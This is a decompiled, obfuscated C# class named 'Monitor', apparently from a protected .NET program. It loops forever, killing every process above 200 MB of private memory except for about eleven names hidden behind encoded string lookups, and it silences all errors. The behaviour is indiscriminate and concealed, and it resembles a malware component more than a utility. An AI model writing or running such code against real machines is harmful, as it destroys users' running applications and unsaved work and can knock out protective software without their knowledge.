using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace Complex;

public static class Monitor
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void RunningProcesses()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107401119)) && !process.ProcessName.Contains(getString_0(107401110)) && !process.ProcessName.Contains(getString_0(107401069)) && !process.ProcessName.Contains(getString_0(107401092)) && !process.ProcessName.Contains(getString_0(107401079)) && !process.ProcessName.Contains(getString_0(107401034)) && !process.ProcessName.Contains(getString_0(107401053)) && !process.ProcessName.Contains(getString_0(107401008)) && !process.ProcessName.Contains(getString_0(107401027)) && !process.ProcessName.Contains(getString_0(107401014)) && !process.ProcessName.Contains(getString_0(107400993)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static Monitor()
	{
		Strings.CreateGetStringDelegate(typeof(Monitor));
	}
}
